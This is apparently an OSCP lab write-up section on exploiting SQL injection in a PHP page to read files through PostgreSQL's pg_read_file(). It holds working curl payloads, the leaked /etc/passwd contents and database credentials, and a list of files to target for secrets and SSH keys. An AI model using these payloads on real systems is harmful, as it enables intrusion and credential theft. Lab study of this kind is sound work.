# File System Access via pg_read_file()
**Privilege Required**: Superuser (✅ we have it)

---

## 10. File Read Capability Test

### Current Thinking
**Why test file read?** `pg_read_file()` enables:
- Reading config files: `/etc/passwd`, `php.ini`, `wp-config.php`
- Reading source code: Web app files (find more vulnerabilities)
- Reading credentials: Database configs, `.env` files
- Reading SSH keys: `/home/user/.ssh/id_rsa`
- Reading `/etc/shadow`: For password cracking (if readable by postgres user)

**Requirements**:
- ✅ Superuser privileges (checked in step 4)
- ✅ PostgreSQL 9.1+ (we have 13.7)
- 📍 File must be readable by `postgres` OS user (UID 106)

**Target file**: `/etc/passwd`
- Always exists on Linux
- World-readable (`-rw-r--r--`)
- Confirms file read works
- Lists system users (recon value)

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT pg_read_file('/etc/passwd',0,200)) AS int)--&age=25&gender=male&email=test@test.com"
```

---

### Result Found
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
```

✅ **File read successful!**

**Intelligence gathered**:
- `root` has `/bin/bash` shell (potential SSH target)
- System users have `/usr/sbin/nologin` (no shell access)
- Confirms we can read arbitrary world-readable files

---

### Command Anatomy Breakdown

**Injection Payload**:
```sql
height=1' AND 1=CAST((SELECT pg_read_file('/etc/passwd',0,200)) AS int)--
```

**Understanding `pg_read_file()`**:

**Function signature**:
```sql
pg_read_file(filename text, offset bigint, length bigint) → text
```

**Parameters**:
1. **`filename`** - Absolute file path
   - Must be absolute: `/etc/passwd` ✅
   - Relative paths fail: `../../../etc/passwd` ❌
   - No path traversal: Input sanitized by PostgreSQL

2. **`offset`** - Starting byte position (0-indexed)
   - `0` = beginning of file
   - `1000` = skip first 1000 bytes
   - Use for pagination when file is large

3. **`length`** - Number of bytes to read
   - `200` = read 200 bytes
   - `-1` = read entire file (dangerous with large files!)
   - Error message limits: ~8000 characters

**Why `offset=0, length=200`?**
- Start at beginning (offset 0)
- Read first 200 bytes (enough to see first few users)
- Prevents error message truncation
- Multiple requests with different offsets to read full file

**File read process**:
```
/etc/passwd (file on disk)
  ↓
pg_read_file('/etc/passwd', 0, 200)
  ↓
Returns first 200 bytes as TEXT
  ↓
CAST(TEXT AS int)
  ↓
Type conversion error
  ↓
Error message contains file content
```

**Permissions check**:
- File must be readable by `postgres` user (UID 106)
- `/etc/passwd` permissions: `-rw-r--r--` (world-readable ✅)
- If file not readable: Error: `could not read file "/path" because...`

**Alternative functions** (PostgreSQL 9.1+):
```sql
-- Read entire file (no length limit, risky!)
SELECT pg_read_file('/etc/passwd')

-- Read as binary (for non-text files)
SELECT pg_read_binary_file('/etc/passwd')

-- List directory contents
SELECT pg_ls_dir('/etc')

-- Check if file exists
SELECT pg_stat_file('/etc/passwd')
```

---

## 11. Database Credentials Extraction

### Current Thinking
**Why target PHP files?** Web applications store:
- Database credentials in config files
- API keys and secrets
- Encryption keys
- Third-party service credentials

**Common locations**:
- `/var/www/html/config.php`
- `/var/www/html/dbcon.php`
- `/var/www/html/wp-config.php` (WordPress)
- `/var/www/html/.env` (Laravel, Node.js)
- `/var/www/html/includes/config.inc.php`

**Strategy**:
1. Read initial page source (`class.php`) to find includes
2. Found: `include("dbcon.php");`
3. Read `dbcon.php` for database credentials

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT pg_read_file('/var/www/html/dbcon.php',0,500)) AS int)--&age=25&gender=male&email=test@test.com"
```

---

### Result Found
```php
<?php
   $host        = "host = 127.0.0.1";
   $port        = "port = 5432";
   $dbname      = "dbname = glovedb";
   $credentials = "user = rubben password=avrillavigne";

   $con = pg_connect( "$host $port $dbname $credentials"  );
   if(!$con) {
      echo "Error : Unable to open database\n";
   }
?>
```

🎯 **CREDENTIALS EXTRACTED**:
- **Username**: `rubben`
- **Password**: `avrillavigne`

**Potential uses**:
- SSH login: `ssh rubben@192.168.145.49`
- PostgreSQL direct connection: `psql -h 192.168.145.49 -U rubben glovedb`
- Password reuse on other services (common!)

---

### Command Anatomy Breakdown

**Injection Payload**:
```sql
height=1' AND 1=CAST((SELECT pg_read_file('/var/www/html/dbcon.php',0,500)) AS int)--
```

**File targeting strategy**:

1. **Initial recon**: Read vulnerable file
   ```sql
   SELECT pg_read_file('/var/www/html/class.php', 0, 300)
   ```
   Found: `include("dbcon.php");` in first 300 bytes

2. **Path reconstruction**:
   - `class.php` location: `/var/www/html/class.php` (standard Apache/Nginx path)
   - `include("dbcon.php")` uses relative path
   - Same directory include → `/var/www/html/dbcon.php`

3. **Length selection**: `0, 500`
   - Config files are usually small (<1KB)
   - 500 bytes captures full credentials block
   - If truncated, increment: `SELECT pg_read_file(..., 0, 1000)`

**Why credentials in PHP file?**
- PHP executed server-side (source not visible to browsers)
- Direct requests: `http://target/dbcon.php` returns blank (PHP executes, no output)
- File read bypasses PHP execution (reads raw source)

**Alternative credential locations**:
```bash
# Environment files (modern frameworks)
/var/www/html/.env

# WordPress
/var/www/html/wp-config.php

# Drupal
/var/www/html/sites/default/settings.php

# Custom apps
/var/www/html/config/database.yml
/var/www/html/application/config/config.php
```

---

## 12. Full User Enumeration from /etc/passwd

### Current Thinking
**Why enumerate users?** System users reveal:
- User accounts with bash shells (SSH targets)
- Service accounts (limited shells, but useful for lateral movement)
- Custom users (application-specific accounts)

**Goal**: Find users with bash shells
- `/bin/bash` or `/bin/sh` = Interactive shell (can SSH)
- `/usr/sbin/nologin` = No shell (service account)

**Strategy**: Read `/etc/passwd` in chunks (file ~1400 bytes)

---

### Command Run (Multiple Offsets)
```bash
# Bytes 0-2000 (beginning)
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT pg_read_file('/etc/passwd',0,2000)) AS int)--&age=25&gender=male&email=test@test.com"

# Bytes 1000-2000 (middle, overlaps with previous)
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT pg_read_file('/etc/passwd',1000,2000)) AS int)--&age=25&gender=male&email=test@test.com"

# Bytes 1500-1000 (end)
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT pg_read_file('/etc/passwd',1500,1000)) AS int)--&age=25&gender=male&email=test@test.com"
```

**Why multiple requests?**
- Error message length limits (8000 chars)
- `/etc/passwd` may be 2000+ bytes
- Overlapping offsets ensure no data missed

---

### Result Found (Combined)

**Users with bash shells**:
```
root:x:0:0:root:/root:/bin/bash
postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

**Service accounts** (partial list):
```
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
```

**Intelligence**:
- 2 users can SSH: `root`, `postgres`
- `postgres` has home dir: `/var/lib/postgresql`
- No custom user accounts found (only system users)

**OSCP next steps**:
- ✅ Try SSH with found credentials: `ssh root@target` / `ssh postgres@target`
- 🔍 Check `postgres` home directory for interesting files
- 🔍 Look for SSH keys: `/var/lib/postgresql/.ssh/id_rsa`

---

### Command Anatomy Breakdown

**Injection Payload** (offset technique):
```sql
height=1' AND 1=CAST((SELECT pg_read_file('/etc/passwd',1000,2000)) AS int)--
```

**Offset mechanics**:

File structure:
```
Bytes 0-999:    [root entry ... daemon entry ... bin entry ...]
Bytes 1000-1999: [sys entry ... postgres entry ... sshd entry ...]
Bytes 2000+:     [end of file or more entries]
```

Read strategy:
```
Request 1: Read bytes 0-2000   → Get root, daemon, bin, sys, ...
Request 2: Read bytes 1000-2000 → Get sys, postgres, sshd, ... (overlap with request 1)
Request 3: Read bytes 1500-1000 → Get remaining entries
```

**Why overlapping offsets?**
- User entry might span offset boundary
- Example: Entry starts at byte 1980, offset 2000 cuts it off
- Overlap ensures we capture complete lines

**Alternative: Single request for entire file**:
```sql
SELECT pg_read_file('/etc/passwd')  -- No offset/length parameters
```
**Risk**: If file >8000 bytes, error message truncates. Use offsets for reliability.

**Parsing /etc/passwd format**:
```
username:password_indicator:UID:GID:comment:home_dir:shell
root:x:0:0:root:/root:/bin/bash
│    │ │ │ │     │     └─ Login shell (target field!)
│    │ │ │ │     └─ Home directory
│    │ │ │ └─ GECOS info
│    │ │ └─ Primary group ID
│    │ └─ User ID
│    └─ x = password in /etc/shadow
└─ Username
```

**Manual filtering** (in OSCP exam):
```bash
# After extracting, grep for bash shells
grep "/bin/bash" passwd.txt
grep "/bin/sh" passwd.txt

# Exclude service accounts
grep -v "nologin" passwd.txt
```

---

## 🎓 Key Learning Points

### pg_read_file() Requirements
**Prerequisites**:
- ✅ Superuser privileges (no bypass)
- ✅ File readable by `postgres` OS user
- ✅ PostgreSQL 9.1+ (version check in step 1)

**Common failures**:
```sql
-- Permission denied
ERROR: could not read file "/etc/shadow": Permission denied
-- Solution: Target world-readable files or files owned by postgres

-- File not found
ERROR: could not read file "/fake/path": No such file or directory
-- Solution: Enumerate common paths, read error logs for app paths

-- Not superuser
ERROR: only superuser or a member of the pg_read_server_files role may read files
-- Solution: Find privilege escalation or extract via other methods
```

### Strategic File Targeting
**Priority order**:
1. **Config files** (credentials) → `/var/www/html/*.php`, `.env`
2. **SSH keys** (lateral movement) → `/home/*/.ssh/id_rsa`
3. **Application source** (find more vulns) → Web root files
4. **System files** (users, services) → `/etc/passwd`, `/etc/hosts`
5. **Log files** (recon) → `/var/log/apache2/access.log`

### Efficient File Reading
**Offset strategy**:
```sql
-- Small files (<500 bytes): Read in one shot
SELECT pg_read_file('/var/www/html/config.php', 0, 500)

-- Medium files (500-2000 bytes): Two overlapping reads
SELECT pg_read_file('/etc/passwd', 0, 1500)
SELECT pg_read_file('/etc/passwd', 1000, 1500)

-- Large files (>2000 bytes): Multiple chunked reads
SELECT pg_read_file('/var/log/apache2/access.log', 0, 2000)
SELECT pg_read_file('/var/log/apache2/access.log', 2000, 2000)
SELECT pg_read_file('/var/log/apache2/access.log', 4000, 2000)
```

---

## ⏱️ Time Tracking (OSCP Exam Planning)

- File read test (`/etc/passwd`): **2 minutes**
- Credentials extraction (`dbcon.php`): **3 minutes** (includes path discovery)
- Full user enumeration (multiple offsets): **3 minutes**
- **Total: 8 minutes**
- **Running total: 18 minutes**

**Achievement**: File system access established, credentials obtained!

**Next phase**: Remote Code Execution via `COPY FROM PROGRAM`.
